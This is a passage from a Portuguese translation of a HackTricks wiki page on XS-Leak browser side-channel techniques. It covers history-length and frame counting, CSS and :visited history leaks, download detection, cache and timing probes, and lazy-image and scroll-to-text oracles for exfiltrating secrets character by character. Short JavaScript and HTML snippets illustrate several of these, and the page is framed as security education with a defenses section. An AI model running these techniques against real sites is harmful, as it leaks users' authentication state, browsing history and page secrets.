Um atacante poderia usar c√≥digo JavaScript para **manipular a localiza√ß√£o do frame/pop-up para uma adivinhada** e **imediatamente** **mud√°-la para `about:blank`**. Se o comprimento do hist√≥rico aumentou, isso significa que a URL estava correta e teve tempo para **aumentar porque a URL n√£o √© recarregada se for a mesma**. Se n√£o aumentou, significa que **tentou carregar a URL adivinhada**, mas porque **imediatamente depois** carregou **`about:blank`**, o **comprimento do hist√≥rico nunca aumentou** ao carregar a URL adivinhada.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Contagem de Frames

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumo:** Avalie a quantidade de elementos iframe inspecionando a propriedade `window.length`.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar o **n√∫mero de frames em uma web** aberta via `iframe` ou `window.open` pode ajudar a identificar o **status do usu√°rio naquela p√°gina**.\
Al√©m disso, se a p√°gina tiver sempre o mesmo n√∫mero de frames, verificar **continuamente** o n√∫mero de frames pode ajudar a identificar um **padr√£o** que pode vazar informa√ß√µes.

Um exemplo dessa t√©cnica √© que no Chrome, um **PDF** pode ser **detectado** com **contagem de frames** porque um `embed` √© usado internamente. Existem [Par√¢metros de URL Abertos](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) que permitem algum controle sobre o conte√∫do, como `zoom`, `view`, `page`, `toolbar`, onde essa t√©cnica pode ser interessante.

### Elementos HTML

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Resumo:** Leia o valor vazado para distinguir entre 2 estados poss√≠veis
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

O vazamento de informa√ß√µes atrav√©s de elementos HTML √© uma preocupa√ß√£o na seguran√ßa da web, particularmente quando arquivos de m√≠dia din√¢micos s√£o gerados com base em informa√ß√µes do usu√°rio, ou quando marcas d'√°gua s√£o adicionadas, alterando o tamanho da m√≠dia. Isso pode ser explorado por atacantes para diferenciar entre estados poss√≠veis analisando as informa√ß√µes expostas por certos elementos HTML.

### Informa√ß√µes Expostas por Elementos HTML

* **HTMLMediaElement**: Este elemento revela a `dura√ß√£o` e os tempos `buffered` da m√≠dia, que podem ser acessados via sua API. [Leia mais sobre HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Ele exp√µe `videoHeight` e `videoWidth`. Em alguns navegadores, propriedades adicionais como `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` e `webkitDecodedFrameCount` est√£o dispon√≠veis, oferecendo informa√ß√µes mais detalhadas sobre o conte√∫do da m√≠dia. [Leia mais sobre HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Esta fun√ß√£o fornece detalhes sobre a qualidade da reprodu√ß√£o de v√≠deo, incluindo `totalVideoFrames`, que pode indicar a quantidade de dados de v√≠deo processados. [Leia mais sobre getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Este elemento vaza a `altura` e a `largura` de uma imagem. No entanto, se uma imagem for inv√°lida, essas propriedades retornar√£o 0, e a fun√ß√£o `image.decode()` ser√° rejeitada, indicando a falha ao carregar a imagem corretamente. [Leia mais sobre HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### Propriedade CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Resumo:** Identifique varia√ß√µes no estilo do site que correlacionam com o estado ou status do usu√°rio.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplica√ß√µes web podem alterar o **estilo do site dependendo do status do usu√°rio**. Arquivos CSS de origem cruzada podem ser incorporados na p√°gina do atacante com o **elemento HTML link**, e as **regras** ser√£o **aplicadas** √† p√°gina do atacante. Se uma p√°gina alterar dinamicamente essas regras, um atacante pode **detectar** essas **diferen√ßas** dependendo do estado do usu√°rio.\
Como uma t√©cnica de vazamento, o atacante pode usar o m√©todo `window.getComputedStyle` para **ler propriedades CSS** de um elemento HTML espec√≠fico. Como resultado, um atacante pode ler propriedades CSS arbitr√°rias se o elemento afetado e o nome da propriedade forem conhecidos.

### Hist√≥rico CSS

* **M√©todos de Inclus√£o**: Elementos HTML
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Resumo:** Detectar se o estilo `:visited` √© aplicado a uma URL indicando que j√° foi visitada
* **Exemplo de C√≥digo**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
De acordo com [**isso**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), isso n√£o funciona no Chrome sem cabe√ßa.
{% endhint %}

O seletor CSS `:visited` √© utilizado para estilizar URLs de forma diferente se j√° foram visitadas anteriormente pelo usu√°rio. No passado, o m√©todo `getComputedStyle()` poderia ser empregado para identificar essas diferen√ßas de estilo. No entanto, navegadores modernos implementaram medidas de seguran√ßa para impedir que esse m√©todo revele o estado de um link. Essas medidas incluem sempre retornar o estilo computado como se o link tivesse sido visitado e restringir os estilos que podem ser aplicados com o seletor `:visited`.

Apesar dessas restri√ß√µes, √© poss√≠vel discernir o estado visitado de um link indiretamente. Uma t√©cnica envolve enganar o usu√°rio para interagir com uma √°rea afetada pelo CSS, utilizando especificamente a propriedade `mix-blend-mode`. Essa propriedade permite a mistura de elementos com seu fundo, potencialmente revelando o estado visitado com base na intera√ß√£o do usu√°rio.

Al√©m disso, a detec√ß√£o pode ser alcan√ßada sem intera√ß√£o do usu√°rio explorando os tempos de renderiza√ß√£o dos links. Como os navegadores podem renderizar links visitados e n√£o visitados de forma diferente, isso pode introduzir uma diferen√ßa de tempo mensur√°vel na renderiza√ß√£o. Um proof of concept (PoC) foi mencionado em um relat√≥rio de bug do Chromium, demonstrando essa t√©cnica usando m√∫ltiplos links para amplificar a diferen√ßa de tempo, tornando assim o estado visitado detect√°vel atrav√©s da an√°lise de tempo.

Para mais detalhes sobre essas propriedades e m√©todos, visite suas p√°ginas de documenta√ß√£o:

* `:visited`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [Documenta√ß√£o MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Vazamento de X-Frame do ContentDocument

* **M√©todos de Inclus√£o**: Frames
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Resumo:** No Google Chrome, uma p√°gina de erro dedicada √© exibida quando uma p√°gina √© bloqueada de ser incorporada em um site de origem cruzada devido a restri√ß√µes de X-Frame-Options.
* **Exemplo de C√≥digo**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

No Chrome, se uma p√°gina com o cabe√ßalho `X-Frame-Options` definido como "deny" ou "same-origin" √© incorporada como um objeto, uma p√°gina de erro aparece. O Chrome retorna de forma √∫nica um objeto de documento vazio (em vez de `null`) para a propriedade `contentDocument` desse objeto, ao contr√°rio de iframes ou outros navegadores. Os atacantes poderiam explorar isso detectando o documento vazio, potencialmente revelando informa√ß√µes sobre o estado do usu√°rio, especialmente se os desenvolvedores definirem de forma inconsistente o cabe√ßalho X-Frame-Options, muitas vezes ignorando p√°ginas de erro. A conscientiza√ß√£o e a aplica√ß√£o consistente de cabe√ßalhos de seguran√ßa s√£o cruciais para prevenir tais vazamentos.

### Detec√ß√£o de Download

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Cabe√ßalhos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Resumo:** Um atacante pode discernir downloads de arquivos aproveitando iframes; a acessibilidade cont√≠nua do iframe implica um download de arquivo bem-sucedido.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

O cabe√ßalho `Content-Disposition`, especificamente `Content-Disposition: attachment`, instrui o navegador a baixar o conte√∫do em vez de exibi-lo inline. Esse comportamento pode ser explorado para detectar se um usu√°rio tem acesso a uma p√°gina que aciona um download de arquivo. Em navegadores baseados em Chromium, existem algumas t√©cnicas para detectar esse comportamento de download:

1. **Monitoramento da Barra de Download**:
* Quando um arquivo √© baixado em navegadores baseados em Chromium, uma barra de download aparece na parte inferior da janela do navegador.
* Monitorando mudan√ßas na altura da janela, os atacantes podem inferir a apari√ß√£o da barra de download, sugerindo que um download foi iniciado.
2. **Navega√ß√£o de Download com Iframes**:
* Quando uma p√°gina aciona um download de arquivo usando o cabe√ßalho `Content-Disposition: attachment`, isso n√£o causa um evento de navega√ß√£o.
* Carregando o conte√∫do em um iframe e monitorando eventos de navega√ß√£o, √© poss√≠vel verificar se a disposi√ß√£o do conte√∫do causa um download de arquivo (sem navega√ß√£o) ou n√£o.
3. **Navega√ß√£o de Download sem Iframes**:
* Semelhante √† t√©cnica do iframe, este m√©todo envolve usar `window.open` em vez de um iframe.
* Monitorar eventos de navega√ß√£o na nova janela aberta pode revelar se um download de arquivo foi acionado (sem navega√ß√£o) ou se o conte√∫do √© exibido inline (a navega√ß√£o ocorre).

Em cen√°rios onde apenas usu√°rios logados podem acionar tais downloads, essas t√©cnicas podem ser usadas para inferir indiretamente o estado de autentica√ß√£o do usu√°rio com base na resposta do navegador ao pedido de download.

### Bypass de Cache HTTP Particionado <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Resumo:** Um atacante pode discernir downloads de arquivos aproveitando iframes; a acessibilidade cont√≠nua do iframe implica um download de arquivo bem-sucedido.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
√â por isso que essa t√©cnica √© interessante: o Chrome agora tem **particionamento de cache**, e a chave de cache da nova p√°gina aberta √©: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, mas se eu abrir uma p√°gina ngrok e usar fetch nela, a chave de cache ser√°: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, a **chave de cache √© diferente**, ent√£o o cache n√£o pode ser compartilhado. Voc√™ pode encontrar mais detalhes aqui: [Ganhando seguran√ßa e privacidade ao particionar o cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Coment√°rio de [**aqui**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Se um site `example.com` inclui um recurso de `*.example.com/resource`, ent√£o esse recurso ter√° a **mesma chave de cache** como se o recurso fosse diretamente **solicitado atrav√©s de navega√ß√£o de n√≠vel superior**. Isso ocorre porque a chave de cache √© composta pelo _eTLD+1_ de n√≠vel superior e pelo _eTLD+1_ do frame.

Como acessar o cache √© mais r√°pido do que carregar um recurso, √© poss√≠vel tentar mudar a localiza√ß√£o de uma p√°gina e cancel√°-la 20ms (por exemplo) depois. Se a origem foi alterada ap√≥s a parada, isso significa que o recurso foi armazenado em cache.\
Ou poderia apenas **enviar algum fetch para a p√°gina potencialmente armazenada em cache e medir o tempo que leva**.

### Redirecionamento Manual <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Resumo:** √â poss√≠vel descobrir se uma resposta a uma solicita√ß√£o fetch √© um redirecionamento
* **Exemplo de C√≥digo**:

![](<../.gitbook/assets/image (652).png>)

### Fetch com AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Tempo
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Resumo:** √â poss√≠vel tentar carregar um recurso e abortar antes que ele seja carregado. Dependendo se um erro √© acionado, o recurso foi ou n√£o armazenado em cache.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Use _**fetch**_ e _**setTimeout**_ com um **AbortController** para detectar se o **recurso est√° armazenado em cache** e para expulsar um recurso espec√≠fico do cache do navegador. Al√©m disso, o processo ocorre sem armazenar novo conte√∫do em cache.

### Polui√ß√£o de Script

* **M√©todos de Inclus√£o**: Elementos HTML (script)
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Resumo:** √â poss√≠vel **sobrescrever fun√ß√µes internas** e ler seus argumentos, mesmo de **script de origem cruzada** (que n√£o pode ser lido diretamente), isso pode **vazar informa√ß√µes valiosas**.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Conte√∫do da P√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Resumo:** Me√ßa o tempo de execu√ß√£o de uma web usando service workers.
* **Exemplo de C√≥digo**:

No cen√°rio dado, o atacante toma a iniciativa de registrar um **service worker** em um de seus dom√≠nios, especificamente "attacker.com". Em seguida, o atacante abre uma nova janela no site alvo a partir do documento principal e instrui o **service worker** a iniciar um temporizador. √Ä medida que a nova janela come√ßa a carregar, o atacante navega para a refer√™ncia obtida na etapa anterior para uma p√°gina gerenciada pelo **service worker**.

Ao chegar a solicita√ß√£o iniciada na etapa anterior, o **service worker** responde com um c√≥digo de status **204 (Sem Conte√∫do)**, efetivamente encerrando o processo de navega√ß√£o. Neste ponto, o **service worker** captura uma medi√ß√£o do temporizador iniciado anteriormente na etapa dois. Essa medi√ß√£o √© influenciada pela dura√ß√£o do JavaScript que causa atrasos no processo de navega√ß√£o.

{% hint style="warning" %}
Em uma medi√ß√£o de tempo de execu√ß√£o, √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Tempo de Fetch

* **M√©todos de Inclus√£o**: Fetch API
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumo:** Use [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir o tempo que leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Tempo entre Janelas

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao Conte√∫do da P√°gina, C√≥digo de Status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumo:** Use [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) para medir o tempo que leva para realizar uma solicita√ß√£o usando `window.open`. Outros rel√≥gios podem ser usados.
* **Exemplo de C√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente com as **ferramentas** da comunidade **mais avan√ßadas** do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Com HTML ou Re Inje√ß√£o

Aqui voc√™ pode encontrar t√©cnicas para exfiltrar informa√ß√µes de um HTML de origem cruzada **injetando conte√∫do HTML**. Essas t√©cnicas s√£o interessantes em casos onde por qualquer motivo voc√™ pode **injetar HTML, mas n√£o pode injetar c√≥digo JS**.

### Marca√ß√£o Pendente

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Carregamento Pregui√ßoso de Imagem

Se voc√™ precisa **exfiltrar conte√∫do** e pode **adicionar HTML antes do segredo**, deve verificar as **t√©cnicas comuns de marca√ß√£o pendente**.\
No entanto, se por qualquer motivo voc√™ **DEVE** fazer isso **caractere por caractere** (talvez a comunica√ß√£o seja via um cache hit), voc√™ pode usar esse truque.

**Imagens** em HTML t√™m um atributo "**loading**" cujo valor pode ser "**lazy**". Nesse caso, a imagem ser√° carregada quando for visualizada e n√£o enquanto a p√°gina est√° carregando:
```html
<img src=/something loading=lazy >
```
Portanto, o que voc√™ pode fazer √© **adicionar muitos caracteres lixo** (Por exemplo, **milhares de "W"s**) para **preencher a p√°gina da web antes do segredo ou adicionar algo como** `<br><canvas height="1850px"></canvas><br>.`\
Ent√£o, se por exemplo nossa **inje√ß√£o aparecer antes da bandeira**, a **imagem** seria **carregada**, mas se aparecer **depois** da **bandeira**, a bandeira + o lixo **impedir√£o que seja carregada** (voc√™ precisar√° brincar com a quantidade de lixo a ser colocada). Isso √© o que aconteceu em [**este writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Outra op√ß√£o seria usar o **scroll-to-text-fragment** se permitido:

#### Scroll-to-text-fragment

No entanto, voc√™ faz o **bot acessar a p√°gina** com algo como
```
#:~:text=SECR
```
Ent√£o a p√°gina da web ser√° algo como: **`https://victim.com/post.html#:~:text=SECR`**

Onde post.html cont√©m os caracteres lixo do atacante e a imagem de carregamento pregui√ßoso e ent√£o o segredo do bot √© adicionado.

O que este texto far√° √© fazer com que o bot acesse qualquer texto na p√°gina que contenha o texto `SECR`. Como esse texto √© o segredo e est√° logo **abaixo da imagem**, a **imagem s√≥ ser√° carregada se o segredo adivinhado estiver correto**. Assim, voc√™ tem seu or√°culo para **exfiltrar o segredo caractere por caractere**.

Algum exemplo de c√≥digo para explorar isso: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Carregamento Pregui√ßoso de Imagem Baseado em Tempo

Se **n√£o for poss√≠vel carregar uma imagem externa** que poderia indicar ao atacante que a imagem foi carregada, outra op√ß√£o seria tentar **adivinhar o caractere v√°rias vezes e medir isso**. Se a imagem for carregada, todas as requisi√ß√µes levariam mais tempo do que se a imagem n√£o for carregada. Isso √© o que foi usado na [**solu√ß√£o deste writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **resumido aqui:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Se `jQuery(location.hash)` for usado, √© poss√≠vel descobrir via tempo **se algum conte√∫do HTML existe**, isso porque se o seletor `main[id='site-main']` n√£o corresponder, n√£o precisa verificar o resto dos **seletor**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Defesas

Existem mitig a√ß√µes recomendadas em [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) tamb√©m em cada se√ß√£o da wiki [https://xsleaks.dev/](https://xsleaks.dev/). D√™ uma olhada l√° para mais informa√ß√µes sobre como se proteger contra essas t√©cnicas.

## Refer√™ncias

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, impulsionados pelas **ferramentas** comunit√°rias **mais avan√ßadas** do mundo.\
Obtenha Acesso Hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
